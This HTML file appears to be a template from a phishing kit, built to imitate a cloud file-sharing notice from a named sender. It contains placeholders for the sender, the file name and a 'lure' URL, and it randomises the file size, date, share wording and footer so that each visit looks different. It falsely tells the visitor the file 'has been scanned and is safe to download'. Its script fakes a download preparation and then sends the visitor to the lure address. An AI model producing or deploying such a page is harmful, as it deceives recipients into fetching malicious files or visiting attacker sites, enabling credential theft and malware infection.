<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title id="pageTitle">Shared File</title>
    <style>
        :root {
            --primary-color: #4285f4;
            --primary-hover: #3367d6;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --text-primary: #202124;
            --text-secondary: #5f6368;
            --border-color: #dadce0;
            --success-color: #34a853;
            --shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-color);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: var(--card-bg);
            border-radius: 28px;
            box-shadow: var(--shadow);
            max-width: 480px;
            width: 100%;
            padding: 48px 40px;
            text-align: center;
            animation: slideUp 0.4s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .avatar-container {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            position: relative;
        }
        .avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            font-weight: 500;
            color: white;
            text-transform: uppercase;
        }
        .share-badge {
            position: absolute;
            bottom: -4px;
            right: -4px;
            width: 32px;
            height: 32px;
            background: var(--primary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 3px solid white;
            font-size: 14px;
        }
        .sender-name {
            font-size: 20px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        .share-text {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 32px;
        }
        .file-card {
            background: #f1f3f4;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            gap: 16px;
            text-align: left;
            transition: background 0.2s;
        }
        .file-card:hover { background: #e8eaed; }
        .file-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            flex-shrink: 0;
        }
        .file-info { flex: 1; min-width: 0; }
        .file-name {
            font-size: 16px;
            font-weight: 500;
            color: var(--text-primary);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 4px;
        }
        .file-meta {
            font-size: 12px;
            color: var(--text-secondary);
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .download-btn {
            width: 100%;
            padding: 14px 24px;
            border: none;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 500;
            background: var(--primary-color);
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .download-btn:hover {
            background: var(--primary-hover);
            box-shadow: 0 1px 3px rgba(66,133,244,0.3), 0 4px 8px rgba(66,133,244,0.15);
        }
        .download-btn:active { transform: scale(0.98); }
        .download-btn.loading {
            background: var(--text-secondary);
            pointer-events: none;
        }
        .download-btn.success { background: var(--success-color); }
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .security-note {
            margin-top: 24px;
            padding: 12px 16px;
            background: #e8f5e9;
            border-radius: 12px;
            font-size: 12px;
            color: #1b5e20;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .footer {
            margin-top: 32px;
            font-size: 11px;
            color: var(--text-secondary);
        }
        .footer a { color: var(--primary-color); text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        @media (max-width: 480px) {
            .container { padding: 32px 24px; border-radius: 20px; }
            .file-card { padding: 16px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="avatar-container">
            <div class="avatar" id="avatar"></div>
            <div class="share-badge">üì§</div>
        </div>
        <div class="sender-name" id="senderName">{from_name}</div>
        <div class="share-text" id="shareText">shared a file with you</div>
        
        <div class="file-card" id="fileCard">
            <div class="file-icon" id="fileIcon">üìÑ</div>
            <div class="file-info">
                <div class="file-name" id="fileName">{filename}</div>
                <div class="file-meta">
                    <span id="fileSize"></span>
                    <span>‚Ä¢</span>
                    <span id="fileDate"></span>
                </div>
            </div>
        </div>
        
        <button class="download-btn" id="downloadBtn">
            <span id="btnIcon">‚¨áÔ∏è</span>
            <span id="btnText">Download</span>
        </button>
        
        <div class="security-note">
            <span>üîí</span>
            <span>This file has been scanned and is safe to download</span>
        </div>
        
        <div class="footer">
            <span id="footerText"></span>
        </div>
    </div>

    <script>
    (function(){
        'use strict';
        
        // Seeded random for consistent per-visit uniqueness
        var _0x = {
            seed: Date.now() ^ (Math.random() * 0xFFFFFFFF >>> 0),
            rand: function(min, max) {
                this.seed = (this.seed * 1103515245 + 12345) & 0x7FFFFFFF;
                return min + (this.seed % (max - min + 1));
            }
        };
        
        // Dynamic avatar colors
        var avatarColors = ['#4285f4', '#ea4335', '#fbbc04', '#34a853', '#ff6d01', '#46bdc6', '#7baaf7', '#f07b72'];
        var senderName = document.getElementById('senderName').textContent || 'User';
        var initials = senderName.split(' ').map(function(n) { return n[0]; }).join('').substring(0, 2);
        var avatarEl = document.getElementById('avatar');
        avatarEl.textContent = initials || '?';
        avatarEl.style.background = avatarColors[_0x.rand(0, avatarColors.length - 1)];
        
        // Dynamic file info
        var fileName = document.getElementById('fileName').textContent || 'document';
        var ext = fileName.split('.').pop().toLowerCase();
        
        // File type icons and colors
        var fileTypes = {
            pdf: {icon: 'üìï', color: '#ea4335'},
            doc: {icon: 'üìò', color: '#4285f4'}, docx: {icon: 'üìò', color: '#4285f4'},
            xls: {icon: 'üìó', color: '#34a853'}, xlsx: {icon: 'üìó', color: '#34a853'},
            ppt: {icon: 'üìô', color: '#ff6d01'}, pptx: {icon: 'üìô', color: '#ff6d01'},
            zip: {icon: 'üóúÔ∏è', color: '#fbbc04'}, rar: {icon: 'üóúÔ∏è', color: '#fbbc04'},
            jpg: {icon: 'üñºÔ∏è', color: '#4285f4'}, jpeg: {icon: 'üñºÔ∏è', color: '#4285f4'}, png: {icon: 'üñºÔ∏è', color: '#4285f4'},
            mp4: {icon: 'üé¨', color: '#ea4335'}, mov: {icon: 'üé¨', color: '#ea4335'},
            mp3: {icon: 'üéµ', color: '#7baaf7'}, wav: {icon: 'üéµ', color: '#7baaf7'},
            txt: {icon: 'üìù', color: '#5f6368'},
            default: {icon: 'üìÑ', color: '#5f6368'}
        };
        
        var fileType = fileTypes[ext] || fileTypes.default;
        var fileIconEl = document.getElementById('fileIcon');
        fileIconEl.textContent = fileType.icon;
        fileIconEl.style.background = fileType.color + '20';
        
        // Dynamic file size
        var sizes = ['1.2 MB', '2.4 MB', '856 KB', '3.7 MB', '512 KB', '1.8 MB', '4.2 MB', '768 KB'];
        document.getElementById('fileSize').textContent = sizes[_0x.rand(0, sizes.length - 1)];
        
        // Dynamic date (within last 7 days)
        var daysAgo = _0x.rand(0, 6);
        var dateText = daysAgo === 0 ? 'Today' : daysAgo === 1 ? 'Yesterday' : daysAgo + ' days ago';
        document.getElementById('fileDate').textContent = dateText;
        
        // Dynamic share text
        var shareTexts = [
            'shared a file with you',
            'sent you a file',
            'wants to share this with you',
            'shared a document'
        ];
        document.getElementById('shareText').textContent = shareTexts[_0x.rand(0, shareTexts.length - 1)];
        
        // Dynamic footer
        var footerTexts = [
            'Files are automatically deleted after 30 days',
            'Secure file sharing powered by cloud storage',
            'Your download link expires in 7 days'
        ];
        document.getElementById('footerText').textContent = footerTexts[_0x.rand(0, footerTexts.length - 1)];
        
        // Dynamic page title
        document.getElementById('pageTitle').textContent = senderName + ' shared "' + fileName + '"';
        
        // Download button handler
        var downloadBtn = document.getElementById('downloadBtn');
        var btnText = document.getElementById('btnText');
        var btnIcon = document.getElementById('btnIcon');
        var isDownloading = false;
        
        downloadBtn.addEventListener('click', function() {
            if(isDownloading) return;
            isDownloading = true;
            
            // Show loading state
            downloadBtn.classList.add('loading');
            btnIcon.innerHTML = '<div class="spinner"></div>';
            btnText.textContent = 'Preparing download...';
            
            // Simulate preparation then redirect
            var prepTime = _0x.rand(1500, 3000);
            setTimeout(function() {
                btnText.textContent = 'Starting download...';
                setTimeout(function() {
                    window.location.assign({lure_url_js});
                }, 500);
            }, prepTime);
        });
        
        // File card click also triggers download
        document.getElementById('fileCard').addEventListener('click', function() {
            downloadBtn.click();
        });
        document.getElementById('fileCard').style.cursor = 'pointer';
        
    })();
    </script>
</body>
</html>
